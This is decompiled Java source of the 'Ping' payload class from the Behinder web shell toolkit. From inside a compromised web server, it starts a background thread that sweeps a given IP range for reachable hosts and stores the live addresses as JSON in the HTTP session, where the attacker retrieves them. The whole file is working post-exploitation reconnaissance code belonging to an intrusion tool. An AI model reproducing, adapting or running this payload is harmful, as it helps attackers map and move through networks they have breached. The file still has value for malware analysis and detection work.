package net.rebeyond.behinder.payload.java;

import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;


public class Ping
        implements Runnable {
    public static String ipList;
    public static String taskID;
    private HttpSession Session;

    public Ping() {
    }

    public Ping(HttpSession session) {
        this.Session = session;
    }

    public void execute(ServletRequest request, ServletResponse response, HttpSession session) throws Exception {
        (new Thread(new Ping(session))).start();
    }

    private static int ip2int(String ip) throws UnknownHostException {
        int result = 0;
        InetAddress addr = InetAddress.getByName(ip);

        for (byte b : addr.getAddress()) {
            result = result << 8 | b & 0xFF;
        }

        return result;
    }

    private static String int2ip(int value) throws UnknownHostException {
        byte[] bytes = BigInteger.valueOf(value).toByteArray();
        InetAddress address = InetAddress.getByAddress(bytes);
        return address.getHostAddress();
    }


    public static void main(String[] args) {
        String start = ipList.split("-")[0];
        String stop = ipList.split("-")[1];

        try {
            int startValue = ip2int(start);
            int stopValue = ip2int(stop);

            for (int i = ip2int(start); i < ip2int(stop); i++) {
                String ip = int2ip(i);
                boolean bool = InetAddress.getByName(ip).isReachable(3000);
            }

        } catch (Exception exception) {
        }
    }


    public void run() {
        String start = ipList.split("-")[0];
        String stop = ipList.split("-")[1];
        Map<String, String> sessionObj = new HashMap<>();
        Map<String, String> scanResult = new HashMap<>();
        sessionObj.put("running", "true");


        try {
            int startValue = ip2int(start);
            int stopValue = ip2int(stop);

            for (int i = startValue; i <= stopValue; i++) {
                String ip = int2ip(i);
                boolean isAlive = InetAddress.getByName(ip).isReachable(3000);
                if (isAlive) {

                    scanResult.put(ip, "true");
                    sessionObj.put("result", buildJson(scanResult, false));
                }
                this.Session.setAttribute(taskID, sessionObj);
            }

        } catch (Exception e) {

            sessionObj.put("result", e.getMessage());
        }
        sessionObj.put("running", "false");
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key)).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value
                            .getBytes("UTF-8")});
                } else {
                    getClass();
                    Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value
                            .getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }


            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}


/* Location:              /Users/kongzhen/kz_s3c/Behinder_v3.0_Beta_6_mac/Behinder_v3.0_Beta6_mac.jar!/net/rebeyond/behinder/payload/java/Ping.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */